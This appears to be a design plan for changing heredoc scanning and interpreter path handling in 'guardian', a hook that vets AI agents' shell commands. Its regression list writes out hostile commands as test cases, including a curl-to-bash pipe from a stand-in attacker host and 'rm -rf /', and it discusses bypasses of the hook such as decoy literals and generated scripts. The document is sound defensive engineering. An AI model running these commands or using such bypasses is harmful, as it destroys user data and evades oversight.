---
status: not-started
progress: "Unified plan drafted, pending technical detail from implementation teammate"
---

# Unified Plan: Heredoc Scanning Redesign + Interpreter Path Resolution

**Date**: 2026-03-21
**Severity**: HIGH (combines CRITICAL curl|bash regression prevention + MEDIUM usability fixes)
**Supersedes**: `heredoc-pattern-false-positives.md` (Plan A), `interpreter-path-resolution.md` (Plan B)
**Related**: `interpreter-heredoc-bypass.md` (incorporated as Phase 3, not subsumed)
**Basis**: `temp/final-verdict.md` (2-round, 5-teammate, 4-external-model review process)

---

## Problem

Two independent usability problems degrade guardian effectiveness through alert fatigue:

**1. Heredoc body false positives (from Plan A).**
Layer 0 (`match_block_patterns`) and Layer 0b (`match_ask_patterns`) scan the raw command string before `split_commands()` processes heredoc bodies. Text in data heredoc bodies -- documentation, tutorials, seed data, config files -- triggers false DENY or ASK verdicts when it matches block/ask regex patterns. Real false positives include: `git push --force` in tutorials (Scenario C), `find -delete` in cleanup notes (Scenario D), `curl|bash` in installation docs (Scenario F), SQL in seed data (Scenario I).

**2. Interpreter path resolution false positives (from Plan B).**
When an interpreter command (`python3 -c`, `node -e`) contains destructive APIs targeting safe project-internal paths (e.g., `.staging/` cleanup), the F1 safety net fires an ASK because `extract_paths()` cannot resolve paths from interpreter payloads. This triggers 5-10 unnecessary interruptions per session for routine operations, conditioning users to auto-allow -- itself a security failure.

**3. Pre-existing bugs affecting both.**
`_parse_heredoc_delimiter()` mishandles backslash-escaped delimiters, causing silent command consumption. `_is_data_heredoc_command()` has a fail-open default. The absence of `re.MULTILINE` in pattern matching is an accidental defense-in-depth mechanism whose implications must be audited before any heredoc scanning changes.

### What is NOT broken (adversarial corrections)

- **Scenarios A/B are not actual false positives.** `rm -rf /` in heredoc bodies does NOT match block patterns today because `$` anchor (without `re.MULTILINE`) requires end-of-string. The false positive problem is real but less severe than initially claimed.
- **"Generated executable bypass" is pre-existing.** `cat > script.sh << EOF\nrm -rf /\nEOF\nbash script.sh` is NOT caught by Layer 0 today either. This is a stateless-hook architectural limitation, not a new regression.
- **re.MULTILINE is double-edged.** Adding it would INCREASE false positives by making heredoc body content match `$`-anchored patterns. The absence is accidental defense-in-depth. Requires per-pattern audit, not blind addition.

---

## Phase 0: Bug Fixes (no dependencies, implement first)

- [ ] **0a. Fix `_parse_heredoc_delimiter()` backslash + ANSI-C handling.** `cat << \EOF` stores `\EOF` as delimiter instead of `EOF`, causing `_consume_heredoc_bodies()` to consume all remaining input as body -- silently discarding subsequent dangerous commands. Also handle `$'EOF'` and `$"EOF"` variants.
- [ ] **0b. Fix `_is_data_heredoc_command()` fail-open default.** When `heredoc_idx == -1` (no `<<` found), currently returns `True` (fail-open). Change to `return False` (fail-closed).
- [ ] **0c. Audit `re.MULTILINE` impact pattern-by-pattern.** For each block/ask pattern in `guardian.default.json` and `guardian.recommended.json`, determine whether `$` and `^` anchors are used and whether `re.MULTILINE` would help or hurt. Document the decision per pattern. Do NOT blindly add the flag.
- [ ] **0d. Tests for Phase 0 fixes.** Backslash delimiter tests, fail-closed default tests, re.MULTILINE audit regression tests.

---

## Phase 1: Heredoc Body Redaction (depends on Phase 0)

Core redesign: build `redact_safe_heredocs(raw_command) -> str` as a pre-processing step. Layer 0/0b continue scanning a single whole-command string (preserving cross-pipeline patterns like `curl|bash`), but the string has safe heredoc bodies replaced with empty content.

- [ ] **1a. Implement `redact_safe_heredocs()`.** Walks the raw command string, identifies `<<` operators and delimiters, classifies each heredoc's consumer using a hybrid classifier, replaces safe heredoc bodies with empty strings while preserving delimiter lines and all surrounding operators. Fails closed (returns original unmodified command on any parse error).
- [ ] **1b. Implement hybrid heredoc classifier.** Classification priority order: (1) interpreter blocklist -> UNSAFE/retain; (2) output redirection `>` or `>>` present -> UNSAFE/retain; (3) pipeline member -> UNSAFE/retain; (4) passive data sink allowlist -> SAFE/redact; (5) unknown command -> UNSAFE/retain (fail-closed). The redirection-based heuristic is the primary signal for identifying safe heredoc contexts -- it naturally handles `cat > file.md << EOF` without enumerating every safe command.
- [ ] **1c. Integrate into `main()`.** Layer 0 scans `redact_safe_heredocs(command)` instead of raw `command`. Layer 0b likewise. Everything else (split_commands, Layer 1, Layers 3/4) continues using the original command string unchanged. Validate redaction boundaries against command chaining (`;`, `&&`, `||`) and bash quoting edge cases.
- [ ] **1d. Tests for Phase 1.** New test file `tests/regression/test_heredoc_redaction.py`. Must-have cases: data heredoc body redacted (no false DENY); interpreter heredoc body retained (DENY fires); `curl|bash` pipeline preserved in redacted string; write-to-file heredoc body retained; pipe-to-interpreter body retained; actual `rm -rf /` (not in heredoc) still blocked; backslash delimiter parsed correctly post-Phase 0 fix.

### Phase 1 design notes

- The "heredoc-redacted scanning" approach was proposed by R1 but never adversarially attacked. It MUST receive the same scrutiny as Plan A before shipping: concrete design, edge case tracing, attack surface analysis. In particular: overlapping heredocs, same-delimiter-name heredocs, interaction with backslash delimiter bugs (Phase 0a), and ReDoS surface in the redaction pass.
- The redaction creates a synthetic string that bash will never actually see, introducing a parsing differential. This is accepted as lower-risk than Plan A's per-sub-command scanning (which breaks cross-pipeline patterns), but must be tested thoroughly.

---

## Phase 2: F1 Interpreter Path Resolution + Message Enrichment (independent of Phase 1)

Reduce F1 ASK frequency for legitimate interpreter operations by extracting paths from interpreter payloads. This addresses the alert fatigue problem that the initial review identified as a security failure but then recommended preserving.

- [ ] **2a. Implement `extract_paths_from_interpreter_payload()`.** Regex-based string literal extraction from interpreter payloads. Restricted to literal strings and glob patterns. f-strings, triple-quotes, concatenation, and variable references fail-closed to F1 ASK. Acceptable: the AI-agent threat model means straightforward code patterns dominate.
- [ ] **2b. Restrict `glob.glob()` to project-internal paths.** `glob.glob()` already exists in baseline `extract_paths()` at `bash_guardian.py:971`, so this is not a novel attack surface. But restrict expansion to within `project_dir` to prevent filesystem oracle attacks.
- [ ] **2c. Enrich F1 ASK messages.** When F1 fires for interpreter commands (whether or not paths are extracted), include the detected destructive API name and a truncated payload excerpt. This helps users make fast yes/no decisions even when path resolution fails. Enriched messages apply regardless of Phase 2a -- if path extraction is deferred, message enrichment ships independently.
- [ ] **2d. Tests for Phase 2.** Unit tests for path extraction (motivating `.staging/` case, single-file case, variable-only paths, obfuscated paths). Security regression tests (decoy literal alongside obfuscated target, Layer 0 still blocks single-line interpreter deletions). Integration tests verifying F1 behavior change.

### Phase 2 design notes

- Phase 2 operates on the post-redacted command string when Phase 1 is also implemented. This is correct: interpreter heredoc bodies are RETAINED by Phase 1 (interpreters are in the blocklist), so Phase 2's path extraction sees the full payload.
- The decoy literal attack (benign string alongside `chr()`-encoded destructive path) is valid in theory but violates the stated threat model (AI agents generate straightforward code, not obfuscated payloads). The risk of alert fatigue from 5-10 ASKs per session is a more concrete and immediate security failure.
- F1 verdict changes from ASK to ALLOW only when ALL extracted paths pass the full validation pipeline (zeroAccess, noDelete, readOnly, symlink, project boundary). If ANY path fails or no paths can be extracted, F1 still fires.

---

## Phase 3: Interpreter+Heredoc ASK Backstop (depends on Phase 1)

Defense-in-depth for the case where interpreter heredoc body content evades block patterns. Plan A's claim that it subsumes `interpreter-heredoc-bypass.md` was invalid because `[^|&\n]*` in block pattern regexes prevents matching across newline boundaries, even in retained bodies.

- [ ] **3a. Implement `_is_interpreter_heredoc()` detection.** Lightweight function (~20 LOC) that checks if a sub-command starts with an interpreter and contains `<<`.
- [ ] **3b. Integrate into per-sub-command loop in `main()`.** When detected, escalate to ASK (not DENY -- legitimate uses of `bash << EOF` exist). This complements Phase 1's redaction: Phase 1 ensures data heredoc bodies don't cause false positives, Phase 3 ensures interpreter heredoc bodies get human review even when block patterns can't match their multiline content.
- [ ] **3c. Tests for Phase 3.** New test file `tests/security/test_interpreter_heredoc.py`. Cases: `bash << EOF` with destructive body triggers ASK; `cat << EOF` (data sink) does NOT trigger ASK; `python3 << EOF` triggers ASK; pipeline variant `cat << EOF | bash` triggers ASK.

---

## Testing Plan

### Test files to create/modify

| Phase | Test File | Est. Methods |
|-------|-----------|-------------|
| 0 | `tests/regression/test_delimiter_parsing.py` | ~10 |
| 1 | `tests/regression/test_heredoc_redaction.py` | ~25 |
| 2 | `tests/regression/test_interpreter_path_resolution.py` | ~15 |
| 3 | `tests/security/test_interpreter_heredoc.py` | ~10 |

### Regression gates

All existing test suites must pass at each phase boundary:
- `python -m pytest tests/core/ tests/security/ -v` (168+ heredoc tests, bypass tests, fail-closed tests)
- `python -m pytest tests/regression/ -v` (session start, existing regression tests)
- Specific suites: `TestScanProtectedPathsHeredocAware`, `TestArithmeticBypassPrevention`, `TestCommentHeredocRegression`

### Critical regression scenarios

- `rm -rf /` (not in heredoc) still blocked at Layer 0
- `curl https://evil.com | bash` still blocked at Layer 0 (the CRITICAL regression Plan A would have caused)
- `python3 -c "os.remove('.env')"` still blocked at Layer 0
- `git push --force origin main` still blocked at Layer 0
- All zeroAccess/noDelete/readOnly path protections unchanged

---

## Security Analysis

### Threat model

Guardian protects against AI agents accidentally performing destructive operations, not against malicious humans with terminal access. An attacker who can craft arbitrary commands already has code execution.

### Security invariants preserved

| Invariant | How preserved |
|-----------|--------------|
| Fail-closed end-to-end | Phase 0 fixes fail-open default. Phase 1 returns unmodified command on error. Phase 2 returns to F1 ASK when no paths extracted. Unknown commands default to UNSAFE in classifier. |
| Layer 0 cross-pipeline detection | Phase 1 scans redacted whole-command string, not per-sub-command. `curl\|bash` pattern sees the full pipeline. |
| F1 safety net integrity | Phase 2 only changes ASK->ALLOW when ALL extracted paths pass full validation. No paths or failed validation -> F1 still fires. |
| Write-to-file heredoc bodies scanned | Phase 1 classifier retains bodies when output redirection is present. |
| Interpreter heredoc bodies scanned | Phase 1 classifier retains bodies for interpreter commands. Phase 3 adds ASK backstop. |

### Known accepted risks

- **Parsing differential from redaction.** `redact_safe_heredocs()` creates a synthetic string. Mitigated by fail-closed default and thorough testing, but fundamentally introduces a string bash will never see.
- **Allowlist maintenance burden.** New passive data sinks require explicit addition. Mitigated by fail-closed default (unknown = UNSAFE) and the redirection heuristic reducing dependence on command enumeration.
- **Regex extraction limitations (Phase 2).** f-strings, triple-quotes, concatenation are unresolvable. Accepted as fail-closed to ASK. AI agents generate straightforward code.
- **Decoy literal attack (Phase 2).** Benign string alongside obfuscated destructive path could suppress F1. Outside threat model (AI agents don't generate obfuscated code). If threat model changes, Phase 2 can be reverted independently.

---

## Supersedes

### `action-plans/heredoc-pattern-false-positives.md` (Plan A)

**Status change**: not-started -> superseded by this plan.

**What is kept**: `_DATA_HEREDOC_COMMANDS` allowlist concept (renamed to `_PASSIVE_DATA_SINKS`), `_is_data_heredoc_command()` function (with fail-open fix), backslash delimiter fix, pipe-to-interpreter awareness, test structure.

**What is discarded**: Per-sub-command Layer 0/0b scanning (breaks `curl|bash` -- the CRITICAL flaw), pipe-to-interpreter mitigation inside `split_commands()` (structurally broken due to split-on-pipe ordering), subsumption claim over `interpreter-heredoc-bypass.md` (invalid -- block patterns can't match multiline content).

**Why replaced**: Plan A's core architecture (moving Layer 0/0b to per-sub-command) was the root cause of the CRITICAL `curl|bash` regression. The redesign (whole-command redaction) preserves Plan A's valuable components while eliminating the architectural flaw.

### `action-plans/interpreter-path-resolution.md` (Plan B)

**Status change**: not-started -> superseded by this plan (Phase 2).

**What is kept**: The problem statement (F1 false positives for interpreter commands are real and cause alert fatigue). The fail-closed design principle (no paths = F1 still fires). The `glob.glob()` expansion concept (with project-internal restriction).

**What is discarded**: Nothing is fully discarded. The initial review's recommendation to dismiss Plan B entirely was overcorrection. The adversarial review found that alert fatigue from preserved F1 ASK is a larger real-world security risk than the theoretical decoy literal attack.

**What is constrained**: `glob.glob()` restricted to project-internal paths. Regex extraction limitations accepted as documented (fail-closed to ASK for unresolvable cases).

**Why replaced**: Plan B is incorporated as Phase 2 of this unified plan rather than maintained as a separate action plan. This ensures correct ordering (Phase 1 redaction ships before Phase 2 path resolution) and prevents the two plans from creating conflicting changes to the same code paths.

### `action-plans/interpreter-heredoc-bypass.md`

**Status change**: unchanged (remains not-started as independent plan, but implementation is tracked as Phase 3 of this unified plan).

**Why not superseded**: Plan A incorrectly claimed to subsume this plan. The adversarial review confirmed it remains independently needed as defense-in-depth. It is incorporated as Phase 3 here for implementation ordering, but the original plan document remains valid.

---

## Estimated Effort

| Phase | Est. LOC (code) | Est. LOC (tests) | Sessions |
|-------|-----------------|-------------------|----------|
| 0 | ~20 | ~40 | 0.5 |
| 1 | ~120 | ~200 | 1-2 |
| 2 | ~70 | ~120 | 1 |
| 3 | ~25 | ~80 | 0.5 |
| **Total** | **~235** | **~440** | **3-4** |

## Files to Modify

| Phase | File | Change Summary |
|-------|------|---------------|
| 0a | `hooks/scripts/bash_guardian.py` | Fix `_parse_heredoc_delimiter()` for backslash, `$'...'`, `$"..."` |
| 0b | `hooks/scripts/bash_guardian.py` | Fix `_is_data_heredoc_command()` fail-open default |
| 0c | `assets/guardian.default.json`, `assets/guardian.recommended.json` | Audit and document re.MULTILINE impact per pattern |
| 1a | `hooks/scripts/bash_guardian.py` | New `redact_safe_heredocs()` function |
| 1b | `hooks/scripts/bash_guardian.py` | `_PASSIVE_DATA_SINKS`, `_INTERPRETER_COMMANDS`, hybrid classifier |
| 1c | `hooks/scripts/bash_guardian.py` | Integrate redaction into `main()` Layer 0/0b calls |
| 2a | `hooks/scripts/_guardian_utils.py` | New `extract_paths_from_interpreter_payload()` |
| 2b | `hooks/scripts/_guardian_utils.py` | Restrict `glob.glob()` to project-internal |
| 2c | `hooks/scripts/bash_guardian.py` | Enrich F1 ASK messages with API + payload excerpt |
| 3a-b | `hooks/scripts/bash_guardian.py` | `_is_interpreter_heredoc()` + per-sub-command loop integration |
